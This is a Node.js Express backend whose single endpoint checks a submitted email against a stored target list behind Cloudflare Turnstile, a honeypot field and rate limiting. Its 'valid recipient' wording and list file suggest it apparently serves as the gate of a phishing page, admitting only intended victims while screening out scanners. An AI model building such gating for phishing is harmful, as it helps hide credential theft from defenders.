require('dotenv').config();

const express = require('express');
const cors = require('cors');
const fs = require('fs');
const path = require('path');
const fetch = require('node-fetch');
const rateLimit = require('express-rate-limit');

const app = express();
const PORT = process.env.PORT || 3000;
const EMAIL_FILE = path.join(__dirname, 'ogas', 'oga.txt');
const CLOUDFLARE_SECRET = process.env.CLOUDFLARE_SECRET;

let validEmails = [];
function loadEmails() {
  try {
    const data = fs.readFileSync(EMAIL_FILE, 'utf8');
    validEmails = data.split('\n').map(e => e.trim().toLowerCase());
    console.log('[INFO] Email list loaded into memory');
  } catch (err) {
    console.error('[ERROR] Failed to read email list:', err);
  }
}
loadEmails();

const limiter = rateLimit({
  windowMs: 60 * 1000,
  max: 10, // feel free to adjust as needed
  message: { valid: false, message: 'Too many requests, try again later.' },
});

app.use(cors());
app.use(express.json());
app.use(limiter);

app.post('/api/check-email', async (req, res) => {
  const { email, captchaToken, middleName } = req.body;

  // Honeypot anti-bot trap
  if (middleName && middleName.trim() !== '') {
    console.warn('[BOT] Honeypot field triggered');
    return res.status(403).json({ valid: false, message: 'Bot activity detected' });
  }

  if (!email || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
    console.warn('[WARN] Invalid or missing email attempt:', email);
    return res.status(400).json({ valid: false, message: 'Invalid or missing email format' });
  }

  if (!captchaToken) {
    console.warn('[WARN] Missing captcha token attempt');
    return res.status(400).json({ valid: false, message: 'Captcha missing' });
  }

  // Cloudflare CAPTCHA verification
  try {
    const verifyRes = await fetch('https://challenges.cloudflare.com/turnstile/v0/siteverify', {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: `secret=${CLOUDFLARE_SECRET}&response=${captchaToken}`,
    });
    const verifyData = await verifyRes.json();
    if (!verifyData.success) {
      console.warn('[WARN] Captcha verification failed:', verifyData);
      return res.status(400).json({ valid: false, message: 'Captcha failed. Please reload the page' });
    }
  } catch (err) {
    console.error('[ERROR] Captcha verification error:', err);
    return res.status(500).json({ valid: false, message: 'Captcha verification error' });
  }

  const isValid = validEmails.includes(email.toLowerCase());
  console.log(`[INFO] Email verification result for ${email}: ${isValid}`);
  res.json({ valid: isValid, message: isValid ? 'Valid email' : 'Enter the valid recipient email to continue' });
});

app.listen(PORT, () => {
  console.log(`Backend running on http://localhost:${PORT}`);
});
